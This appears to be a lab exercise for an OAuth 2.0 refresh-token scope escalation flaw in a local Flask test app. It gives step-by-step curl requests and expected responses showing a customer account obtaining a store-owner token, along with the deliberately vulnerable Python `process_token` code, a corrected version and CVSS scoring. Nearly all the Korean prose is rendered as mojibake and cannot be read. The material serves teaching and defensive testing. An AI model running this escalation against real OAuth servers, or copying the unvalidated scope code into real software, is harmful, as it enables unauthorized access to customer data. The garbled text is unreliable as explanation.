# OAuth 2.0 Scope Escalation Vulnerability - Test Scenario

## ì·¨ì•½ì  ê°œìš”

**ì·¨ì•½ì  ìœ í˜•**: OAuth 2.0 Refresh Tokenì„ í†µí•œ Scope ê¶Œí•œ ìƒìŠ¹
**ìœ„í—˜ë„**: HIGH
**ì˜í–¥**: ì¼ë°˜ ê³ ê°(customer)ì´ ì ì£¼(store) ê¶Œí•œì„ íšë“í•˜ì—¬ ë¯¼ê°í•œ ì •ë³´ ì ‘ê·¼ ê°€ëŠ¥

## ì·¨ì•½ì  ì„¤ëª…

OAuth 2.0 Refresh Token Grantì—ì„œ ìƒˆë¡œìš´ Access Tokenì„ ë°œê¸‰ë°›ì„ ë•Œ, ì›ë˜ ë¶€ì—¬ë°›ì€ scopeë³´ë‹¤ ë” ë†’ì€ ê¶Œí•œì˜ scopeë¥¼ ìš”ì²­í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.

**ì •ìƒ ë™ì‘**:
```
ì´ˆê¸° ë¡œê·¸ì¸ scope: customer
Refresh ì‹œ ìš”ì²­ ê°€ëŠ¥í•œ scope: customer ì´í•˜ (profile, customer)
```

**ì·¨ì•½í•œ ë™ì‘**:
```
ì´ˆê¸° ë¡œê·¸ì¸ scope: customer
Refresh ì‹œ ìš”ì²­ ê°€ëŠ¥í•œ scope: ê²€ì¦ ì—†ìŒ â†’ store scope ìš”ì²­ ê°€ëŠ¥!
```

## ì‹œìŠ¤í…œ êµ¬ì¡°

```
ì†Œë¹„ì ì•± (customer scope)
    â†“
ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡ (Refresh Tokenìœ¼ë¡œ store scope ìš”ì²­)
    â†“
ì ì£¼ ê¶Œí•œ íšë“ (store scope Access Token)
    â†“
ì ì£¼ ëŒ€ì‹œë³´ë“œ ì ‘ê·¼ (ë¯¼ê° ì •ë³´ ìœ ì¶œ)
```

## í…ŒìŠ¤íŠ¸ ì‹œë‚˜ë¦¬ì˜¤

### 1. í™˜ê²½ ì„¤ì •

**ì„œë²„ ì‹¤í–‰**:
```bash
# ê°€ìƒí™˜ê²½ í™œì„±í™”
python -m venv venv
venv\Scripts\activate  # Windows
# source venv/bin/activate  # macOS/Linux

# ì˜ì¡´ì„± ì„¤ì¹˜
pip install -r requirements.txt

# ë°ì´í„°ë² ì´ìŠ¤ ì´ˆê¸°í™” ë° í…ŒìŠ¤íŠ¸ ë°ì´í„° ìƒì„±
flask create-test-data

# ì„œë²„ ì‹¤í–‰
python app.py
```

ì„œë²„ê°€ `http://localhost:3000`ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤.

**í…ŒìŠ¤íŠ¸ ê³„ì •**:
- Customer: `customer1` / `password123` (role: customer)
- Store Owner: `storeowner1` / `password123` (role: store)
- OAuth Client ID: `android_app_client`
- OAuth Client Secret: `secret123`

---

### 2. ì •ìƒ íë¦„ í…ŒìŠ¤íŠ¸ (Store Owner ë¡œê·¸ì¸)

#### Step 1: Store Ownerë¡œ ë¡œê·¸ì¸ ë° í† í° ë°œê¸‰

```bash
curl -X POST http://localhost:3000/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password" \
  -d "username=storeowner1" \
  -d "password=password123" \
  -d "client_id=android_app_client" \
  -d "client_secret=secret123" \
  -d "scope=store"
```

**ì˜ˆìƒ ì‘ë‹µ**:
```json
{
  "access_token": "eyJ0eXAiOiJKV1Qi...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "def50200...",
  "scope": "store"
}
```

#### Step 2: Store Dashboard ì ‘ê·¼ (ì •ìƒ)

```bash
curl -X GET http://localhost:3000/api/store/dashboard \
  -H "Authorization: Bearer <ACCESS_TOKEN>"
```

**ì˜ˆìƒ ì‘ë‹µ**:
```json
{
  "message": "Store owner dashboard - PRIVILEGED ACCESS",
  "user": "storeowner1",
  "role": "store",
  "scope": "store",
  "revenue": 125000,
  "pending_orders": 5,
  "customer_data": [...]
}
```

âœ… **ì •ìƒ ë™ì‘**: Store ownerëŠ” store dashboard ì ‘ê·¼ ê°€ëŠ¥

---

### 3. ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡ (Customer â†’ Store ê¶Œí•œ ìƒìŠ¹)

#### Step 1: Customerë¡œ ë¡œê·¸ì¸ (ë‚®ì€ ê¶Œí•œ)

```bash
curl -X POST http://localhost:3000/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password" \
  -d "username=customer1" \
  -d "password=password123" \
  -d "client_id=android_app_client" \
  -d "client_secret=secret123" \
  -d "scope=customer"
```

**ì˜ˆìƒ ì‘ë‹µ**:
```json
{
  "access_token": "eyJ0eXAiOiJKV1Qi...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "def50200abc...",
  "scope": "customer"
}
```

**ì¤‘ìš”**: `refresh_token` ê°’ì„ ì €ì¥í•˜ì„¸ìš”!

#### Step 2: Customer scopeë¡œ Customer API ì ‘ê·¼ (ì •ìƒ)

```bash
curl -X GET http://localhost:3000/api/customer/orders \
  -H "Authorization: Bearer <CUSTOMER_ACCESS_TOKEN>"
```

**ì˜ˆìƒ ì‘ë‹µ**:
```json
{
  "message": "Customer orders endpoint",
  "user": "customer1",
  "role": "customer",
  "scope": "customer",
  "orders": [...]
}
```

âœ… **ì •ìƒ ë™ì‘**: CustomerëŠ” customer API ì ‘ê·¼ ê°€ëŠ¥

#### Step 3: Customer scopeë¡œ Store Dashboard ì ‘ê·¼ ì‹œë„ (ì°¨ë‹¨ë¨)

```bash
curl -X GET http://localhost:3000/api/store/dashboard \
  -H "Authorization: Bearer <CUSTOMER_ACCESS_TOKEN>"
```

**ì˜ˆìƒ ì‘ë‹µ**:
```json
{
  "error": "insufficient_scope",
  "error_description": "The access token has insufficient scope"
}
```

âœ… **ì •ìƒ ë™ì‘**: CustomerëŠ” store API ì ‘ê·¼ ë¶ˆê°€

---

### 4. ğŸš¨ ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡: Refresh Tokenìœ¼ë¡œ Scope ìƒìŠ¹

#### Step 4: Refresh Tokenìœ¼ë¡œ Store Scope ìš”ì²­ (ì·¨ì•½ì !)

```bash
curl -X POST http://localhost:3000/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=<CUSTOMER_REFRESH_TOKEN>" \
  -d "client_id=android_app_client" \
  -d "client_secret=secret123" \
  -d "scope=store"
```

**ğŸš¨ ì·¨ì•½í•œ ì‘ë‹µ**:
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJ...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "def50200xyz...",
  "scope": "store"  â† ì›ë˜ëŠ” customerì˜€ëŠ”ë° storeë¡œ ìƒìŠ¹!
}
```

**ì¤‘ìš”**:
- ì›ë˜ `customer` scopeë¡œ ë¡œê·¸ì¸í–ˆì§€ë§Œ
- Refresh Token ê°±ì‹  ì‹œ `scope=store`ë¥¼ ìš”ì²­í•˜ë©´
- **ê²€ì¦ ì—†ì´** `store` scopeì˜ ìƒˆë¡œìš´ Access Tokenì´ ë°œê¸‰ë¨!

#### Step 5: íšë“í•œ Store Tokenìœ¼ë¡œ Store Dashboard ì ‘ê·¼ (ê¶Œí•œ ìƒìŠ¹ ì„±ê³µ!)

```bash
curl -X GET http://localhost:3000/api/store/dashboard \
  -H "Authorization: Bearer <NEW_STORE_ACCESS_TOKEN>"
```

**ğŸš¨ ì·¨ì•½í•œ ì‘ë‹µ**:
```json
{
  "message": "Store owner dashboard - PRIVILEGED ACCESS",
  "user": "customer1",  â† customer ê³„ì •ì¸ë°
  "role": "customer",   â† roleë„ customerì¸ë°
  "scope": "store",     â† store scopeë¥¼ ê°€ì§€ê²Œ ë¨!
  "revenue": 125000,
  "pending_orders": 5,
  "customer_data": [
    {"name": "Customer A", "phone": "010-1234-5678"},
    {"name": "Customer B", "phone": "010-9876-5432"}
  ]
}
```

**ğŸš¨ ì·¨ì•½ì  ì„±ê³µ**:
- `customer1` ê³„ì • (ì¼ë°˜ ê³ ê°)
- `customer` roleì„ ê°€ì§€ê³  ìˆìŒ
- í•˜ì§€ë§Œ `store` scope Tokenì„ íšë“í•˜ì—¬
- **ì ì£¼ ì „ìš© ëŒ€ì‹œë³´ë“œì™€ ë¯¼ê°í•œ ê³ ê° ì •ë³´ì— ì ‘ê·¼ ê°€ëŠ¥**!

---

## ì·¨ì•½ì  ì›ì¸ (ì½”ë“œ ë¶„ì„)

### ì·¨ì•½í•œ ì½”ë“œ: `oauth2.py`

```python
class RefreshTokenGrant(grants.RefreshTokenGrant):
    # ...

    # VULNERABILITY: Scope escalation via refresh token
    def process_token(self, token, request):
        # INSECURE: Should validate that new scope is subset of original scope
        # Currently allows arbitrary scope escalation (e.g., customer -> store)
        requested_scope = request.data.get('scope')
        if requested_scope:
            request.scope = requested_scope  # â† ê²€ì¦ ì—†ì´ ìš”ì²­ scope í—ˆìš©!
        else:
            request.scope = token.scope
```

**ë¬¸ì œì **:
1. ì›ë˜ ë°œê¸‰ë°›ì€ tokenì˜ scopeë¥¼ ê²€ì¦í•˜ì§€ ì•ŠìŒ
2. ìš”ì²­í•œ `scope` íŒŒë¼ë¯¸í„°ë¥¼ ê·¸ëŒ€ë¡œ í—ˆìš©
3. `customer` â†’ `store` ë“± ê¶Œí•œ ìƒìŠ¹ì´ ììœ ë¡­ê²Œ ê°€ëŠ¥

---

## ì˜¬ë°”ë¥¸ êµ¬í˜„ (ìˆ˜ì • ë°©ì•ˆ)

### ì•ˆì „í•œ ì½”ë“œ ì˜ˆì‹œ

```python
class RefreshTokenGrant(grants.RefreshTokenGrant):
    def process_token(self, token, request):
        requested_scope = request.data.get('scope')
        original_scope = set(token.scope.split())

        if requested_scope:
            requested_scope_set = set(requested_scope.split())

            # ìš”ì²­í•œ scopeê°€ ì›ë˜ scopeì˜ ë¶€ë¶„ì§‘í•©ì¸ì§€ ê²€ì¦
            if not requested_scope_set.issubset(original_scope):
                raise InvalidScopeError(
                    'Requested scope exceeds original scope'
                )

            request.scope = requested_scope
        else:
            request.scope = token.scope
```

**ìˆ˜ì • ì‚¬í•­**:
1. ì›ë˜ tokenì˜ scopeë¥¼ ê°€ì ¸ì˜´
2. ìš”ì²­í•œ scopeê°€ ì›ë˜ scopeì˜ **ë¶€ë¶„ì§‘í•©**ì¸ì§€ ê²€ì¦
3. ì´ˆê³¼í•˜ëŠ” ê²½ìš° ì—ëŸ¬ ë°˜í™˜
4. `customer` scopeë¡œ ë°œê¸‰ë°›ì•˜ìœ¼ë©´ `customer` ì´í•˜ë§Œ ìš”ì²­ ê°€ëŠ¥

---

## ì˜í–¥ ë° ìœ„í—˜ë„

### ì˜í–¥ ë°›ëŠ” ëŒ€ìƒ
- ì¼ë°˜ ê³ ê° ì•± ì‚¬ìš©ìê°€ ì ì£¼ ê¶Œí•œ íšë“ ê°€ëŠ¥
- ì ì£¼ ì „ìš© ê¸°ëŠ¥ ë¬´ë‹¨ ì ‘ê·¼
- ë¯¼ê°í•œ ë§¤ì¶œ ì •ë³´, ê³ ê° ë°ì´í„° ìœ ì¶œ

### ìœ„í—˜ë„: HIGH
- **ê¸°ë°€ì„± ì¹¨í•´**: ì ì£¼ ëŒ€ì‹œë³´ë“œì˜ ë¯¼ê° ì •ë³´ ìœ ì¶œ
- **ë¬´ê²°ì„± ì¹¨í•´**: ì ì£¼ ê¸°ëŠ¥(ë©”ë‰´ ìˆ˜ì •, ì˜ì—… ìƒíƒœ ë³€ê²½ ë“±) ë¬´ë‹¨ ì¡°ì‘ ê°€ëŠ¥
- **ê¶Œí•œ ìƒìŠ¹**: ë‚®ì€ ê¶Œí•œ(customer) â†’ ë†’ì€ ê¶Œí•œ(store)

### CVSS Score (ì˜ˆìƒ)
- Base Score: 8.1 (HIGH)
- Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

---

## ì‹¤ìŠµ ê³¼ì œ

1. **ì·¨ì•½ì  ì¬í˜„**: ìœ„ ì‹œë‚˜ë¦¬ì˜¤ëŒ€ë¡œ customer ê³„ì •ìœ¼ë¡œ store dashboard ì ‘ê·¼í•´ë³´ê¸°
2. **ìˆ˜ì • êµ¬í˜„**: `oauth2.py`ì˜ `RefreshTokenGrant.process_token` ë©”ì„œë“œë¥¼ ì•ˆì „í•˜ê²Œ ìˆ˜ì •
3. **ê²€ì¦**: ìˆ˜ì • í›„ ë‹¤ì‹œ í…ŒìŠ¤íŠ¸í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì´ ì°¨ë‹¨ë˜ëŠ”ì§€ í™•ì¸

---

## ì°¸ê³  ìë£Œ

- [RFC 6749 - OAuth 2.0 Framework](https://datatracker.ietf.org/doc/html/rfc6749#section-6)
- [OAuth 2.0 Threat Model - Section 4.4.1.7](https://datatracker.ietf.org/doc/html/rfc6819#section-4.4.1.7)
- [OWASP - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
